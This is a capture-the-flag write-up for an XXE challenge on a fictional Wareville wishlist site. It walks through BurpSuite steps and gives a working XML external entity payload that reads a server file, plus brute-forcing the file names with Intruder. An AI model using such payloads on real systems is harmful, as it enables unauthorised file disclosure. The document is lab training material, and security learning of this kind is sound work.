# SOC-MAS XXE Challenge

## The Story
The days in Wareville flew by, and Software's projects were nearly complete, just in time for Christmas. One evening, after wrapping up work, Software was strolling through the town when he came across a young boy looking dejected. Curious, Software asked, "What would you like for Christmas?" The boy replied with a sigh, "I wish for a teddy bear, but I know that my family can't afford one."

This brief conversation sparked an idea in Software's mind—what if there was a platform where everyone in town could share their Christmas wishes, and the Mayor's office could help make them come true? Excited by the potential, Software introduced the idea to Mayor Malware, who embraced it immediately. The Mayor encouraged the team to build the platform for the people of Wareville.

Through the developers' dedication and effort, the platform was soon ready and became an instant hit. The townspeople loved it! However, in their rush to meet the holiday deadline, the team had overlooked something critical—thorough security testing. Even Mayor Malware had chipped in to help develop a feature in the final hours. Now, it's up to you to ensure the application is secure and free of vulnerabilities. Can you guarantee the platform runs safely for the people of Wareville?

## Learning Objectives
- **Understand XML Basics**
- **Explore XXE Vulnerabilities**
- **Learn Exploitation Techniques**
- **Understand Remediation Strategies**

## Key Concepts
- **XML**: A markup language to structure and exchange data.  
- **DTD**: Document Type Definition used in XML for defining structure.  
- **Entities**: Data placeholders in XML, exploitable in XXE attacks.  
- **XXE (XML External Entity)**: A vulnerability allowing file reading or external system access via malicious XML entities.

## BurpSuite
**BurpSuite** is a web security testing tool that helps detect and exploit vulnerabilities like XXE, SQL Injection, and more. It includes features like traffic interception, request modification, brute-forcing, and automated testing.

## Question & Answer

### Q1: What is the flag discovered after navigating through the wishes?
**Steps**:  
1. Launch BurpSuite and enable **Burp's browser without sandbox**.  
2. Navigate to `http://MACHINE_IP/product.php`.  
3. Capture and send the `wishlist.php` POST request to Repeater.  
4. Use the payload:  
   ```xml
   <!--?xml version="1.0"?-->
   <!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
   <wishlist>
       <user_id>1</user_id>
       <item>
           <product_id>&payload;</product_id>
       </item>
   </wishlist>
5. Analyze the response.
6. For brute-forcing: Replace with $ placeholders for numbered files.
7. Use Intruder to iterate numbers (1–20).
8. Observe the longer payload response for the flag.

## What is the flag seen on the possible proof of sabotage?
1. Access http://MACHINE_IP/CHANGELOG

## Conclusion 
This challenge highlights the importance of identifying and mitigating XXE vulnerabilities through tools like BurpSuite and secure coding practices.
